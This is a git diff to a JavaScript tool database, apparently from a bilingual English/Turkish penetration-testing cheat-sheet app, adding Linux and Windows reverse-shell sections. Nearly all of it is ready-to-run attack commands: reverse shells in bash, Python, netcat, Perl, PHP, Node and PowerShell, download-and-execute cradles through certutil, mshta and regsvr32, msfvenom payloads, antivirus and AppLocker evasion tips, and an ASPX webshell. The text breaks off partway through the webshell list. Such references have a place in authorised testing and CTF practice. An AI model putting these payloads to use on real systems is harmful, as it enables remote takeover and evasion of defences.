@@ -1469,6 +1469,36 @@ const TOOLS_INFO = {
     en:{summary:"strace and ltrace are Linux system call and library call tracers. strace records every syscall a process makes (file opens, network connections, exec calls), while ltrace tracks library function calls. Together they reveal what a binary is doing at runtime — exposing hardcoded credentials, file paths, network connections, and logic that is invisible in static analysis.",lookFor:["Hardcoded passwords passed to authentication functions","File paths opened by SUID binaries — look for writable paths","Environment variables read at startup — may contain secrets","Network connections made by the binary — IP, port, protocol","Exec calls — binaries calling other binaries with arguments","Temporary files created and unlinked — TOCTOU race conditions"],vulns:["SUID binary opening a config file in a writable path → replace file","Binary calling system() with a relative command → PATH hijack","Credentials passed to open() or write() → visible in strace output","Binary reading /tmp files → symlink attack on race condition","Network binary connecting to hardcoded IP → redirect with iptables","ltrace on custom binary → see strcmp(input, 'secret_password') directly"],creds:["strace -e trace=file ./binary — trace only file-related syscalls","strace -p PID — attach to running process (may need root)","ltrace ./binary — trace library calls (strcmp, strcpy, fopen, etc.)","strace -f ./binary — follow child processes (fork/exec)","Combine: strace -e trace=execve,open,read,write ./binary 2>&1 | grep -i pass"]},
     tr:{summary:"strace ve ltrace, Linux sistem çağrısı ve kütüphane çağrısı izleme araçlarıdır. strace, bir sürecin yaptığı tüm sistem çağrılarını kaydeder (dosya açma, ağ bağlantıları, exec çağrıları); ltrace ise kütüphane fonksiyon çağrılarını takip eder. Birlikte çalışma zamanında bir binary'nin ne yaptığını ortaya koyarlar — statik analizde görünmez olan hardcoded credential'ları, dosya yollarını, ağ bağlantılarını ve mantığı açığa çıkarırlar.",lookFor:["Kimlik doğrulama fonksiyonlarına geçirilen hardcoded şifreler","SUID binary'lerin açtığı dosya yolları — yazılabilir yolları ara","Başlangıçta okunan ortam değişkenleri — gizli bilgiler içerebilir","Binary'nin yaptığı ağ bağlantıları — IP, port, protokol","Exec çağrıları — argümanlarla başka binary'leri çağıran binary'ler","Oluşturulan ve silinen geçici dosyalar — TOCTOU race condition'ları"],vulns:["SUID binary yazılabilir yolda config dosyası açıyor → dosyayı değiştir","Binary göreli komutla system() çağırıyor → PATH hijack","Credential'lar open() veya write()'a geçiriliyor → strace çıktısında görünür","Binary /tmp dosyaları okuyor → race condition'da symlink saldırısı","Binary hardcoded IP'ye bağlanıyor → iptables ile yönlendir","Özel binary'de ltrace → strcmp(girdi, 'gizli_sifre') doğrudan görünür"],creds:["strace -e trace=file ./binary — yalnızca dosya ile ilgili syscall'ları izle","strace -p PID — çalışan sürece bağlan (root gerekebilir)","ltrace ./binary — kütüphane çağrılarını izle (strcmp, strcpy, fopen, vb.)","strace -f ./binary — child process'leri takip et (fork/exec)","Kombinle: strace -e trace=execve,open,read,write ./binary 2>&1 | grep -i pass"]},
   },
+  'revshell-lin':{
+    platform:'lin',
+    en:{
+      summary:"Linux reverse shells are commands executed on the target machine that connect back to your listener (attacker machine). The target machine initiates the outbound connection — bypassing most firewalls that block inbound connections. Every shell listed here auto-fills TARGETIP (your attacker IP) and TARGETPORT (your listener port) from the TARGET page. The Shell Upgrade section is critical — never leave a dumb shell without upgrading it to a full PTY.",
+      lookFor:["Command injection point (RCE) — anywhere user input reaches the OS","File write + execute — webshell upload, cron jobs, SUID binaries","RCE via CVE — identified by nmap/searchsploit on discovered service version","LFI to RCE — log poisoning, /proc/self/fd, PHP sessions","SUID binary — can you escape to shell? (GTFOBins)","PATH hijacking — writable directory earlier in PATH than a root-called binary"],
+      vulns:["Bash /dev/tcp — no binaries needed, pure bash built-in","Python3 pty shell — most reliable, creates pseudo-terminal","socat PTY — best shell quality, fully interactive","mkfifo nc — works on systems without nc -e (most modern nc)","Shell upgrade mandatory — raw shell breaks on Ctrl+C, no tab complete, no vim"],
+      creds:["Set TARGETIP = your attacker/tun0 IP in TARGET page","Set TARGETPORT = your listener port (e.g. 4444, 9001, 443)","Always run listener BEFORE executing the shell payload on target","Prefer socat listener for best PTY quality, rlwrap nc as fallback","After getting shell: ALWAYS do TTY upgrade — see Shell Upgrade section","Check tun0 IP: ip a show tun0 | grep inet"],
+    },
+    tr:{
+      summary:"Linux reverse shell'leri, hedef makinede çalıştırılan ve dinleyicinize (saldırgan makinesine) geri bağlanan komutlardır. Hedef makine giden bağlantıyı başlatır — gelen bağlantıları engelleyen çoğu güvenlik duvarını atlatır. Buradaki her shell, TARGET sayfasından TARGETIP (saldırgan IP'niz) ve TARGETPORT (dinleyici portunuz) ile otomatik doldurulur. Shell Upgrade bölümü kritik önemdedir — ham bir shell'i tam PTY'ye yükseltmeden asla bırakmayın.",
+      lookFor:["Komut enjeksiyonu noktası (RCE) — kullanıcı girdisinin işletim sistemine ulaştığı her yer","Dosya yazma + çalıştırma — webshell yükleme, cron job'ları, SUID binary'ler","CVE üzerinden RCE — keşfedilen servis versiyonunda nmap/searchsploit ile tespit","LFI'dan RCE'ye — log zehirleme, /proc/self/fd, PHP oturumları","SUID binary — shell'e kaçabilir misin? (GTFOBins)","PATH hijacking — root'un çağırdığı binary'den önce PATH'te yazılabilir dizin"],
+      vulns:["Bash /dev/tcp — binary gerekmez, saf bash yerleşiği","Python3 pty shell — en güvenilir, pseudo-terminal oluşturur","socat PTY — en iyi shell kalitesi, tam etkileşimli","mkfifo nc — nc -e olmayan sistemlerde çalışır (çoğu modern nc)","Shell upgrade zorunlu — ham shell Ctrl+C'de bozulur, tab complete yok, vim çalışmaz"],
+      creds:["TARGETIP = kendi saldırgan/tun0 IP'nizi TARGET sayfasına girin","TARGETPORT = dinleyici portunuz (örn. 4444, 9001, 443)","Hedefte payload çalıştırmadan ÖNCE her zaman dinleyiciyi başlatın","En iyi PTY kalitesi için socat dinleyicisini, yedek olarak rlwrap nc'yi tercih edin","Shell aldıktan sonra: MUTLAKA TTY yükselt — Shell Upgrade bölümüne bak","tun0 IP kontrolü: ip a show tun0 | grep inet"],
+    },
+  },
+  'revshell-win':{
+    platform:'win',
+    en:{
+      summary:"Windows reverse shells connect back from a compromised Windows host to your listener. PowerShell is the most versatile — it is built into every modern Windows system and can be used without dropping any files. MSFvenom generates standalone executables and DLLs. Living-off-the-Land techniques use trusted Windows binaries (LOLBins) to download and execute payloads without triggering basic AV. TARGETIP = your attacker IP, TARGETPORT = your listener port.",
+      lookFor:["PowerShell execution policy — Restricted blocks scripts, Bypass/Unrestricted allows","AppLocker / WDAC — may block PowerShell, unsigned executables, scripts","AV/EDR status — Windows Defender default on all modern Windows","File upload to web root — drop ASPX/PHP webshell → execute PS from there","RCE via CVE — unpatched Windows services (PrintSpooler, PetitPotam)","Writable directories — C:\\Windows\\Temp, C:\\Users\\Public are usually writeable"],
+      vulns:["PowerShell one-liner — no file drop, runs in memory","Encoded PS (-EncodedCommand) — bypasses basic keyword filtering","MSFvenom exe — simple but flagged by AV; use staged with multi/handler","LOTL (certutil, mshta, regsvr32) — bypass application whitelisting","Download cradle — IEX(IWR) pulls payload from HTTP server and executes in-memory","AMSI bypass — required when PowerShell blocks malicious strings"],
+      creds:["Set TARGETIP = your attacker/tun0 IP, TARGETPORT = listener port in TARGET page","PowerShell Execution Policy bypass: -ExecutionPolicy Bypass or Set-ExecutionPolicy","If Defender blocks: encode payload in Base64 or use msfvenom staged payload","For listeners: use nc/rlwrap for basic PS, use Metasploit for meterpreter","ASPX webshell is the most reliable on IIS — upload via file upload vuln or writable web root","Check if PS is blocked: try cmd.exe methods (ncat.exe, certutil) instead"],
+    },
+    tr:{
+      summary:"Windows reverse shell'leri, ele geçirilmiş bir Windows hostundan dinleyicinize geri bağlanır. PowerShell en çok yönlüdür — her modern Windows sistemine yerleşiktir ve dosya bırakmadan kullanılabilir. MSFvenom bağımsız çalıştırılabilir dosyalar ve DLL'ler üretir. Living-off-the-Land teknikleri, temel AV'yi tetiklemeden payload indirmek ve çalıştırmak için güvenilir Windows binary'lerini (LOLBin) kullanır. TARGETIP = saldırgan IP'niz, TARGETPORT = dinleyici portunuz.",
+      lookFor:["PowerShell execution policy — Restricted scriptleri engeller, Bypass/Unrestricted izin verir","AppLocker / WDAC — PowerShell'i, imzasız çalıştırılabilir dosyaları ve scriptleri engelleyebilir","AV/EDR durumu — Windows Defender tüm modern Windows'ta varsayılan açık","Web kök dizinine dosya yükleme — ASPX/PHP webshell bırak → oradan PS çalıştır","CVE üzerinden RCE — yamasız Windows servisleri (PrintSpooler, PetitPotam)","Yazılabilir dizinler — C:\\Windows\\Temp, C:\\Users\\Public genellikle yazılabilir"],
+      vulns:["PowerShell one-liner — dosya bırakmaz, bellekte çalışır","Kodlanmış PS (-EncodedCommand) — temel anahtar kelime filtrelemesini atlatır","MSFvenom exe — basit ama AV tarafından işaretlenir; staged'i multi/handler ile kullan","LOTL (certutil, mshta, regsvr32) — uygulama beyaz listesini atlatır","Download cradle — IEX(IWR) HTTP sunucusundan payload çeker ve bellekte çalıştırır","AMSI bypass — PowerShell kötü amaçlı stringleri engellediğinde gerekli"],
+      creds:["TARGETIP = kendi saldırgan/tun0 IP'niz, TARGETPORT = TARGET sayfasına girin","PowerShell Execution Policy bypass: -ExecutionPolicy Bypass veya Set-ExecutionPolicy","Defender engelliyorsa: payload'ı Base64'e kodla veya msfvenom staged payload kullan","Dinleyici için: temel PS için nc/rlwrap, meterpreter için Metasploit kullan","ASPX webshell IIS'de en güvenilirdir — dosya yükleme açığı veya yazılabilir web kökü aracılığıyla yükle","PS engelliyse: cmd.exe yöntemlerini dene (ncat.exe, certutil)"],
+    },
+  },
   binwalk:{
     platform:'lin',
     en:{summary:"binwalk is a firmware analysis and extraction tool. It scans binary files for embedded file signatures, filesystems, compressed archives, and executable code. In CTF challenges it is used on firmware images, unknown binary blobs, and steganography challenges to extract hidden files. It automatically identifies and extracts embedded content.",lookFor:["Firmware images (.bin, .img, .rom) — extract filesystem for analysis","Embedded filesystems: squashfs, cramfs, jffs2, ext2","Compressed data: gzip, lzma, zip embedded in binary","Bootloader or kernel images — find hardcoded credentials","Steganography challenges — hidden data appended to images or archives","Custom binary format CTF challenges — find embedded flags or data"],vulns:["Squashfs filesystem extraction → find /etc/passwd, credentials, private keys","Bootloader credential extraction → default admin passwords hardcoded","Hidden zip/tar inside image → extract and analyze contents","Kernel image analysis → find hardcoded IPs, credentials, debug strings","LZMA-compressed payload extraction → decompress and analyze binary"],creds:["Basic scan: binwalk firmware.bin","Extract all: binwalk -e firmware.bin (creates _firmware.bin.extracted/)","Recursive extract: binwalk -Me firmware.bin (extracts nested archives)","Force extract: binwalk -e --run-as=root firmware.bin","After extract: find . -name '*.conf' -o -name 'passwd' -o -name '*.key' 2>/dev/null"]},
@@ -2488,6 +2518,114 @@ const TOOLS_DB = {
       ]},
     ],
   },
+  'revshell-lin':{
+    label:'revshell-lin', desc:'Linux Reverse Shells',
+    categories:[
+      {name:'Listener Setup (Attacker)',cmds:[
+        {p:'netcat listener (basic)',c:'nc -lvnp TARGETPORT',h:'Start before running payload on target. -l listen, -v verbose, -n no DNS, -p port.'},
+        {p:'rlwrap nc — arrow keys + history',c:'rlwrap nc -lvnp TARGETPORT',h:'Wraps nc with readline. Arrow keys and command history work inside the shell. Highly recommended.'},
+        {p:'pwncat — auto-upgrades shell',c:'pwncat-cs -lp TARGETPORT',h:'Catches any reverse shell and auto-upgrades to PTY. Best handler for Linux shells.'},
+        {p:'socat — full PTY listener (best quality)',c:'socat file:`tty`,raw,echo=0 tcp-listen:TARGETPORT',h:'Gives you the best possible shell quality — fully interactive PTY. Pair with socat shell on target.'},
+        {p:'ncat SSL listener',c:'ncat -lvnp TARGETPORT --ssl',h:'Encrypted listener. Target must also use ncat with --ssl. Evades basic network monitoring.'},
+        {p:'Python HTTP server (serve payloads)',c:'python3 -m http.server TARGETPORT',h:'Serve tools and payloads. Target downloads with wget or curl. Run in /tools/ directory.'},
+      ]},
+      {name:'Bash / Sh',cmds:[
+        {p:'bash -i (most common)',c:'bash -i >& /dev/tcp/TARGETIP/TARGETPORT 0>&1',h:'Classic. Works when bash is present. If fails, try wrapping: bash -c "bash -i >& /dev/tcp/TARGETIP/TARGETPORT 0>&1"'},
+        {p:'bash -c wrapper (for injection)',c:'bash -c "bash -i >& /dev/tcp/TARGETIP/TARGETPORT 0>&1"',h:'Wrap in bash -c when injecting into command fields, cron jobs, or eval() contexts.'},
+        {p:'sh via /dev/tcp',c:'sh -i >& /dev/tcp/TARGETIP/TARGETPORT 0>&1',h:'Use when bash is not available. sh is always present.'},
+        {p:'exec redirect (no subshell)',c:'exec 5<>/dev/tcp/TARGETIP/TARGETPORT;cat <&5|while read l;do $l 2>&5>&5;done',h:'No subshell needed. Good when () syntax is filtered. Uses file descriptor 5.'},
+        {p:'0196 variant',c:'0<&196;exec 196<>/dev/tcp/TARGETIP/TARGETPORT;sh <&196 >&196 2>&196',h:'Alternative fd variant. Use when standard bash shell fails.'},
+        {p:'URL-encoded (for HTTP injection)',c:'bash%20-i%20>%26%20/dev/tcp/TARGETIP/TARGETPORT%200>%261',h:'URL-encode when injecting via HTTP GET parameter or URL. Decode on server side.'},
+      ]},
+      {name:'Python',cmds:[
+        {p:'python3 — os.dup2 (standard)',c:"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"TARGETIP\",TARGETPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",h:'Most portable python3 shell. Uses os.dup2 to redirect stdin/stdout/stderr to socket.'},
+        {p:'python3 — pty.spawn (better shell)',c:"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"TARGETIP\",TARGETPORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",h:'Spawns bash with PTY — better shell quality. Use with rlwrap nc listener.'},
+        {p:'python2 — fallback',c:"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"TARGETIP\",TARGETPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",h:'python2 one-liner. Check version: which python python2 python3. Try all three.'},
+        {p:'python3 — short version',c:"python3 -c 'import pty,socket,os;s=socket.socket();s.connect((\"TARGETIP\",TARGETPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",h:'Compact version combining pty and socket in minimum code. Good for length-limited injections.'},
+      ]},
+      {name:'Netcat / Socat',cmds:[
+        {p:'nc with -e flag (old/BSD nc)',c:'nc -e /bin/sh TARGETIP TARGETPORT',h:'Works on older nc versions and BusyBox nc. Modern ncat/netcat-openbsd removes -e for security.'},
+        {p:'nc mkfifo (no -e needed)',c:'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc TARGETIP TARGETPORT>/tmp/f',h:'Standard trick for modern nc without -e. Creates named pipe for bidirectional comms.'},
+        {p:'nc mkfifo — /dev/shm variant',c:'rm -f /dev/shm/f;mkfifo /dev/shm/f;cat /dev/shm/f|/bin/sh -i 2>&1|nc TARGETIP TARGETPORT>/dev/shm/f',h:'Use /dev/shm (tmpfs) instead of /tmp if /tmp is noexec or monitored.'},
+        {p:'socat — full PTY (best shell)',c:'socat tcp:TARGETIP:TARGETPORT exec:/bin/bash,pty,stderr,setsid,sigint,sane',h:'Best possible shell quality. Full PTY, proper signal handling, tab complete works. Pair with socat PTY listener.'},
+        {p:'socat — download and run',c:'wget -q http://TARGETIP:TARGETPORT/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat tcp:TARGETIP:TARGETPORT exec:/bin/bash,pty,stderr,setsid,sigint,sane',h:'Download static socat binary from your HTTP server then execute. socat usually not installed by default.'},
+      ]},
+      {name:'Perl / Ruby / Lua / Awk',cmds:[
+        {p:'perl (TCP)',c:"perl -e 'use Socket;\$i=\"TARGETIP\";\$p=TARGETPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",h:'Perl is available on most Unix systems. Use when bash/python are restricted.'},
+        {p:'ruby (TCPSocket)',c:"ruby -rsocket -e 'f=TCPSocket.open(\"TARGETIP\",TARGETPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",h:'Ruby one-liner using TCPSocket. Works on systems with ruby installed (common on web servers).'},
+        {p:'lua (socket)',c:"lua -e \"require('socket');require('os');t=require('socket').tcp();t:connect('TARGETIP','TARGETPORT');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",h:'Lua reverse shell. Common on embedded/IoT systems and game servers.'},
+        {p:'awk (gawk)',c:"awk 'BEGIN{s=\"/inet/tcp/0/TARGETIP/TARGETPORT\";while(1){do{s|&getline c;if(c){while((c|&getline)>0)print|&s;close(c)}}while(c!=\"exit\")close(s)}}'",h:'Pure awk reverse shell. Gawk required. Useful when only awk is available.'},
+      ]},
+      {name:'PHP / Node.js',cmds:[
+        {p:'php -r (CLI)',c:"php -r '\$sock=fsockopen(\"TARGETIP\",TARGETPORT);\$proc=proc_open(\"/bin/sh\",[0=>\$sock,1=>\$sock,2=>\$sock],\$pipes);'",h:'PHP CLI reverse shell. Works when PHP is installed and RCE exists via CLI context.'},
+        {p:'php webshell one-liner',c:'<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/TARGETIP/TARGETPORT 0>&1\'"); ?>',h:'Drop in a PHP file on the web root. Access it to trigger the reverse shell.'},
+        {p:'php — full interactive webshell',c:'<?php\n$sock=fsockopen("TARGETIP",TARGETPORT);\n$proc=proc_open("/bin/sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);\n?>',h:'More reliable webshell. proc_open gives full bidirectional I/O.'},
+        {p:'node.js (net module)',c:"node -e \"(function(){var n=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new n.Socket();c.connect(TARGETPORT,'TARGETIP',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});})();\"",h:'Node.js reverse shell using net and child_process modules. Works on Node.js servers.'},
+      ]},
+      {name:'Shell Upgrade — TTY (CRITICAL)',cmds:[
+        {p:'Step 1 — spawn PTY with python3',c:'python3 -c "import pty;pty.spawn(\'/bin/bash\')"',h:'FIRST step after getting a shell. Spawns a proper PTY. Try python3, python, python2 in order.'},
+        {p:'Step 1 alt — spawn PTY with script',c:'script /dev/null -c bash',h:'Alternative to python pty. script is almost always available. Achieves the same result.'},
+        {p:'Step 2 — background the shell',c:'Ctrl + Z',h:'Suspend the remote shell to get back to your local terminal. Shell stays running on the target.'},
+        {p:'Step 3 — fix terminal settings',c:'stty raw -echo; fg',h:'raw = pass all characters through (enables Ctrl+C etc). -echo = stop local echo. fg brings shell back.'},
+        {p:'Step 4 — reset and set TERM',c:'reset\nexport TERM=xterm\nexport SHELL=bash',h:'reset fixes display glitches after stty. TERM=xterm enables colors and clear. SHELL=bash for PS1.'},
+        {p:'Step 5 — match terminal size',c:'stty rows 38 cols 200',h:'Set to match YOUR terminal size. Get your local size with: stty size (run in a local terminal).'},
+        {p:'Get your local terminal size',c:'stty size',h:'Run this in a LOCAL terminal tab before upgrading. Output: rows cols — use those values in Step 5.'},
+        {p:'socat one-shot upgrade (no steps)',c:'-- Attacker (listener):\nsocat file:`tty`,raw,echo=0 tcp-listen:TARGETPORT\n-- Target:\nsocat exec:\'bash -li\',pty,stderr,sane,sigint,setsid tcp:TARGETIP:TARGETPORT',h:'If socat is on target — skip all upgrade steps. Instant full PTY. Download static socat from github if needed.'},
+      ]},
+    ],
+  },
+  'revshell-win':{
+    label:'revshell-win', desc:'Windows Reverse Shells',
+    categories:[
+      {name:'Listener Setup (Attacker)',cmds:[
+        {p:'netcat listener',c:'nc -lvnp TARGETPORT',h:'Basic listener. Works for cmd.exe and PowerShell shells. No PTY upgrade needed on Windows.'},
+        {p:'rlwrap nc (tab complete)',c:'rlwrap nc -lvnp TARGETPORT',h:'Gives you readline — arrow keys and history work inside PowerShell. Recommended.'},
+        {p:'Metasploit multi/handler',c:'msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/x64/shell_reverse_tcp;set LHOST TARGETIP;set LPORT TARGETPORT;run"',h:'Required for staged msfvenom payloads (windows/x64/shell/reverse_tcp). Also works for meterpreter.'},
+        {p:'Metasploit meterpreter handler',c:'msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter/reverse_tcp;set LHOST TARGETIP;set LPORT TARGETPORT;run"',h:'For meterpreter staged payloads. Gives full meterpreter session with post-exploitation modules.'},
+        {p:'Python HTTP server (serve payloads)',c:'python3 -m http.server TARGETPORT',h:'Serve nc.exe, ncat.exe, msfvenom payloads. Target downloads with certutil, bitsadmin, or IWR.'},
+      ]},
+      {name:'PowerShell',cmds:[
+        {p:'PS reverse shell (one-liner)',c:'$client=New-Object System.Net.Sockets.TCPClient("TARGETIP",TARGETPORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+">";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',h:'Full interactive PS shell over TCP. Run from cmd.exe: powershell -c "<paste here>"'},
+        {p:'PS — bypass execution policy',c:'powershell -ExecutionPolicy Bypass -NoProfile -NonInteractive -c "$client=New-Object System.Net.Sockets.TCPClient(\'TARGETIP\',TARGETPORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendbyte=([text.encoding]::ASCII).GetBytes($sendback+\'PS \'+(pwd).Path+\'>\');$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"',h:'-ExecutionPolicy Bypass skips policy. -NoProfile skips profile loading. -NonInteractive no prompts.'},
+        {p:'PS — encoded command (Base64)',c:'-- Generate on Kali:\n$cmd = \'$client=New-Object Net.Sockets.TCPClient("TARGETIP",TARGETPORT);$stream=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$stream.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$s=(iex $d 2>&1|Out-String);$stream.Write(([text.encoding]::ASCII).GetBytes($s),0,$s.Length);$stream.Flush()};$client.Close()\'\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)\n$enc = [Convert]::ToBase64String($bytes)\nWrite-Host "powershell -EncodedCommand $enc"\n-- Run on target:\npowershell -EncodedCommand <BASE64>',h:'-EncodedCommand accepts UTF-16LE Base64. Bypasses simple string filters looking for keywords.'},
+        {p:'PS download cradle + execute',c:"powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://TARGETIP:TARGETPORT/shell.ps1')\"",h:'Downloads and executes PS script from your HTTP server entirely in memory — no disk write. Host Invoke-PowerShellTcp.ps1 (Nishang).'},
+        {p:'PS IWR download cradle',c:"powershell -c \"IEX(IWR -UseBasicParsing http://TARGETIP:TARGETPORT/shell.ps1)\"",h:'IWR = Invoke-WebRequest. -UseBasicParsing avoids IE engine dependency. Works on Server Core.'},
+        {p:'Nishang Invoke-PowerShellTcp',c:"-- Serve Nishang:\ncp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .\necho 'Invoke-PowerShellTcp -Reverse -IPAddress TARGETIP -Port TARGETPORT' >> Invoke-PowerShellTcp.ps1\npython3 -m http.server TARGETPORT\n-- Target runs:\npowershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://TARGETIP:TARGETPORT/Invoke-PowerShellTcp.ps1')\"",h:'Nishang is the standard PS reverse shell framework. Append the invoke call to the script itself.'},
+      ]},
+      {name:'CMD / Netcat (Windows)',cmds:[
+        {p:'ncat.exe -e cmd',c:'ncat.exe -e cmd.exe TARGETIP TARGETPORT',h:'Download ncat.exe from nmap.org/ncat. The -e flag works in Windows ncat. Gives cmd.exe shell.'},
+        {p:'nc64.exe -e cmd',c:'nc64.exe -e cmd.exe TARGETIP TARGETPORT',h:'nc64.exe is the 64-bit nc for Windows. Download from github.com/int0x33/nc.exe'},
+        {p:'Download nc.exe with certutil',c:'certutil -urlcache -split -f http://TARGETIP:TARGETPORT/nc64.exe C:\\Windows\\Temp\\nc64.exe\nC:\\Windows\\Temp\\nc64.exe -e cmd.exe TARGETIP TARGETPORT',h:'certutil is built-in to all Windows. Downloads nc64 from your HTTP server then executes.'},
+        {p:'Download nc.exe with PowerShell',c:'powershell -c "(New-Object Net.WebClient).DownloadFile(\'http://TARGETIP:TARGETPORT/nc64.exe\',\'C:\\Windows\\Temp\\nc64.exe\')"\nC:\\Windows\\Temp\\nc64.exe -e cmd.exe TARGETIP TARGETPORT',h:'Download with PS then run from cmd. Two-stage approach.'},
+        {p:'cmd.exe via PowerShell shell',c:'Start-Process cmd.exe',h:'From inside a PS shell, spawn a cmd.exe. Useful when PS is restricted but cmd is not.'},
+      ]},
+      {name:'MSFvenom Payloads',cmds:[
+        {p:'Windows x64 stageless EXE',c:'msfvenom -p windows/x64/shell_reverse_tcp LHOST=TARGETIP LPORT=TARGETPORT -f exe -o shell.exe',h:'Stageless = self-contained, no handler needed. Listener: nc -lvnp TARGETPORT. Flagged by AV.'},
+        {p:'Windows x64 staged EXE (meterpreter)',c:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=TARGETIP LPORT=TARGETPORT -f exe -o meter.exe',h:'Staged = small stager + full payload from handler. Requires Metasploit multi/handler. Smaller on disk.'},
+        {p:'Windows x64 DLL',c:'msfvenom -p windows/x64/shell_reverse_tcp LHOST=TARGETIP LPORT=TARGETPORT -f dll -o shell.dll',h:'DLL payload. Use when you can trigger DLL loading: rundll32, regsvr32, DLL hijacking.'},
+        {p:'Windows x86 EXE (32-bit)',c:'msfvenom -p windows/shell_reverse_tcp LHOST=TARGETIP LPORT=TARGETPORT -f exe -o shell32.exe',h:'32-bit payload for 32-bit processes. Runs on both x86 and x64 Windows.'},
+        {p:'HTA payload',c:'msfvenom -p windows/x64/shell_reverse_tcp LHOST=TARGETIP LPORT=TARGETPORT -f hta-psh -o shell.hta',h:'HTML Application payload. Executed by mshta.exe. Often bypasses AppLocker script rules.'},
+        {p:'MSI installer payload',c:'msfvenom -p windows/x64/shell_reverse_tcp LHOST=TARGETIP LPORT=TARGETPORT -f msi -o shell.msi\nmsiexec /quiet /qn /i shell.msi',h:'MSI package. Execute silently with msiexec. Sometimes allowed by whitelisting policies.'},
+        {p:'ASP/ASPX payload',c:'msfvenom -p windows/x64/shell_reverse_tcp LHOST=TARGETIP LPORT=TARGETPORT -f aspx -o shell.aspx',h:'For IIS web servers. Upload shell.aspx to web root and browse to it.'},
+        {p:'WAR payload (Tomcat/JBoss)',c:'msfvenom -p java/shell_reverse_tcp LHOST=TARGETIP LPORT=TARGETPORT -f war -o shell.war',h:'Java WAR file. Deploy via Tomcat Manager (/manager/html) or JBoss admin. Cross-platform.'},
+      ]},
+      {name:'Living off the Land (LOLBins)',cmds:[
+        {p:'mshta — execute HTA',c:'mshta.exe http://TARGETIP:TARGETPORT/shell.hta',h:'mshta.exe runs HTML Applications. Fetches and executes remotely. Bypass basic AV and AppLocker.'},
+        {p:'regsvr32 — scriptlet bypass',c:'regsvr32 /s /n /u /i:http://TARGETIP:TARGETPORT/shell.sct scrobj.dll',h:'Uses trusted Windows binary to fetch and execute a COM scriptlet. Classic AppLocker bypass.'},
+        {p:'rundll32 — JS execute',c:'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new ActiveXObject("WScript.Shell");h.Run("cmd.exe /c nc64.exe -e cmd TARGETIP TARGETPORT");',h:'rundll32 executing JavaScript. Triggers WScript.Shell to run commands. Old but effective.'},
+        {p:'bitsadmin — download file',c:'bitsadmin /transfer job /download /priority high http://TARGETIP:TARGETPORT/nc64.exe C:\\Windows\\Temp\\nc64.exe',h:'BITS job download. Built-in to Windows. Used to download tools when PS/certutil are blocked.'},
+        {p:'msiexec — remote MSI',c:'msiexec /quiet /qn /i http://TARGETIP:TARGETPORT/shell.msi',h:'msiexec can fetch and install MSI from URL. Useful when direct download is blocked.'},
+        {p:'wmic — process create',c:'wmic process call create "cmd.exe /c nc64.exe -e cmd TARGETIP TARGETPORT"',h:'WMIC creates process. Old but works on pre-Windows 11 systems. Logged in WMI event log.'},
+        {p:'certutil — decode + execute',c:'certutil -urlcache -split -f http://TARGETIP:TARGETPORT/shell.exe C:\\Windows\\Temp\\shell.exe && C:\\Windows\\Temp\\shell.exe',h:'certutil download then execute. && runs second command only if first succeeds.'},
+      ]},
+      {name:'Web Shells (IIS / Apache)',cmds:[
+        {p:'ASPX cmd webshell (IIS)',c:'<%@ Page Language="C#" %>\n<%@ Import Namespace="System.Diagnostics" %>\n<% \nvar cmd = Request.QueryString["cmd"];\nvar info = new ProcessStartInfo("cmd.exe","/c "+cmd);\ninfo.RedirectStandardOutput=true;info.UseShellExecute=false;\nvar p = Process.Start(info);\nResponse.Write(p.StandardOutput.ReadToEnd());\n%>',h:'Drop as shell.aspx in IIS web root. Access: http://TARGETIP/shell.aspx?cmd=whoami'},
